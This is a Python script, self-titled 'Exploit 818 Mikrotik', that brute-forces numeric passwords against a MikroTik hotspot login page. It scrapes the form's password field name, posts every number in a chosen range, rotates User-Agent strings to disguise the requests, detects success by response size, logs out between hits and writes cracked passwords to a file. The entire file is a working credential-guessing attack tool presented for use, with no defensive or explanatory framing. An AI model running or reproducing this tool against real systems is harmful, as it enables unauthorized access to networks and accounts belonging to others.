#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** (EX-818-M) Exploit 818 Mikrotik ***
# * Version:
#   v1.1
# * Date:
#   19 - 08 - 2019 { Mon 19 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

# Modules
import requests
import time
import os
import sys
from bs4 import BeautifulSoup
sys.path.append('../modules/')
from tools import agent
from color import *


# write this def martaks
def write(M, T):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(T / 100)


def cou(word) -> int():
    n = 0
    for i in word:n += 1
    return n


def req(url, port, maxNumber, minNumber, NL, name_form, Next_Url):
    _URL_ = url
    _PORT_ = port

    # Value Session for Dateless
    _session_ = requests.Session()

    # List of random User-Agents.
    agents = agent()

    # Url target and add http if not find in url !
    _URL_ = f"http://{_URL_}:{_PORT_}{Next_Url}" if _URL_.startswith("http") \
                                                is False else f"{_URL_}:{_PORT_}{Next_Url}"

    # Use User-Agent on headers like proxy
    _session_.headers['User-Agent'] = agents[minNumber]

    # Send password data into Target site
    attack = _session_.post(url=_URL_, data={f"{name_form}": f"{maxNumber}"})

    AllProcess = f"""
          {R}[{N}         {int(NL)}         {R}]{N}
[{B} * {N}] Date                : {attack.headers['Date']}
[{B} * {N}] Content Type        : {attack.headers['Content-Type']}
[{B} * {N}] User-Agent          : {_session_.headers['User-Agent'][0:50]}
[{B} * {N}] url                 : {attack.url}
[{B} * {N}] Date-Hack           : {attack.elapsed.total_seconds()} second
[{B} * {N}] Code-Site           : {attack.status_code} {{' Ok '}}"""

    _URL__O_ = f"http://{_URL_}:{_PORT_}/logout?erase-cookie=on" if _URL_.startswith("http://") \
                                                                    is False else f"{_URL_}:{_PORT_}/logout"

    if int(attack.headers['Content-Length']) < 4000:
        _session_.get(url=_URL__O_)
        _URL__O_ = f"http://{_URL_}:{_PORT_}/{Next_Url}" if _URL_.startswith(
            "http://") is False else f"{_URL_}:{_PORT_}/{Next_Url}"

    # return Number for size Page

    return [int(attack.headers['Content-Length']), str(AllProcess), int(attack.status_code)]


def index_exploit(ip, port, number, file, NextUrl):
    global First\
        , Next_save\
        , ZERO\
        , NameForm

    number = number.split(',')
    if number[1].startswith("0") is True:ZERO = True
    else:ZERO = False

    password_num = int()
    errors_num = int()
    minNumber = int()
    AllFor = int()
    Next_save = int() + 1

    try:

        _URL_ = f"http://{ip}:{port}{NextUrl}" if ip.startswith("http") \
                                                    is False else f"{ip}:{port}{NextUrl}"

        _SOUP_ = BeautifulSoup(requests.get(_URL_).text, "html5lib")
        NameForm = str()
        for i in _SOUP_.findAll("input"):
            _NAME_ = i.get("type")
            if _NAME_ == "text":
                NameForm = i.get("name")
                break
            if _NAME_ == "password":
                NameForm = i.get("name")
                break
    except:
        print("None")

    for Password in range(int(number[0]), int(number[1])):

        smpleA = req(url=ip
                     , port=port
                     , maxNumber=Password if ZERO is False else str(f"0{Password}")
                     , minNumber=minNumber
                     , NL=int(AllFor+1)
                     , name_form=NameForm
                     , Next_Url=NextUrl)

        if AllFor == 0:

            # save any first size page number

            one_Save = smpleA[0]

            Next_save = one_Save

        AllFor += 1

        minNumber = int() if minNumber is 4 else minNumber + 1

        # if size page number is defiant an a first save password
        if smpleA[0] < 4000 and smpleA[2] is 200:
            password_num += 1

            save(True, file=file
                 , ip=ip
                 , port=port
                 , Password=Password
                 , NextUrl=NextUrl)

        if Next_save != smpleA[0] and smpleA[0] > 4000 and smpleA[2] is 200:
            errors_num += 1

            AllFor = 0

            save(False, file=file
                 , ip=ip
                 , port=port
                 , Password=Password
                 , NextUrl=NextUrl)

        First = f"""[{B} * {N}] Find Passwords      : "  {R}{password_num}{N}  "  
[{B} * {N}] Find Errors         : "  {R}{errors_num}{N}  "
[{Y + ' + ' + N if smpleA[0] < 4000 and smpleA[2] is 200  else R + ' - ' + N}] Password            : {f'0{Password}' 
        if ZERO is True else Password} 
[{Y + ' + ' + N if smpleA[0] < 4000 and smpleA[2] is 200 else R + ' - ' + N}] Active-Hack         : {Y + "Find" + N if 
        smpleA[0] < 4000 and smpleA[2] is 200 
        else R + "No Find" + N}"""

        add(
            str(smpleA[1]),

            str(First),

            f'[{Y} ! {N}] {F}{R}Find Passwords {password_num} Please Open This file {file}{N}'
            if password_num != 0 else None,

            f'[{Y} ! {N}] {F}{R}Find Error Size {errors_num} Please Open This file Error{file}{N}'
            if errors_num != 0 else None,
        )

    input(f'{W}{R}---- Find Passwords {password_num} Please Open This file {file} ----{N}')


def save(act, file, ip, port, Password,NextUrl):
    if act is True:
        saveP = open(f'{file}', 'a')
        saveP.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
                    f'Url = http://{ip}:{port}{NextUrl}\nPassword = {Password}\n\n')
        saveP.close()
    else:
        saveE = open(f'Error{file}', 'a')
        saveE.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
                    f'Url = http://{ip}:{port}{NextUrl}\nPassword = {Password}\n\n')
        saveE.close()


def add(T1, T2, passwords, errors):
    L = int()
    while L < 1:
        os.system('clear')
        if passwords is not None:print(f'{passwords}\n')
        if errors is not None:print(errors)
        L += 1
        print(f'{T1}\n{T2}')
        print(f'\n\n\n\n--- Enter Ctrl+C for (exit) ---')


class MAIN(object):
    def __init__(self):
        pass

    def run(self, ip, port, numbers, Next_Url):

        index_exploit(ip=ip
                      , port=port
                      , number=numbers
                      , file="Password"
                      , NextUrl=Next_Url
                      )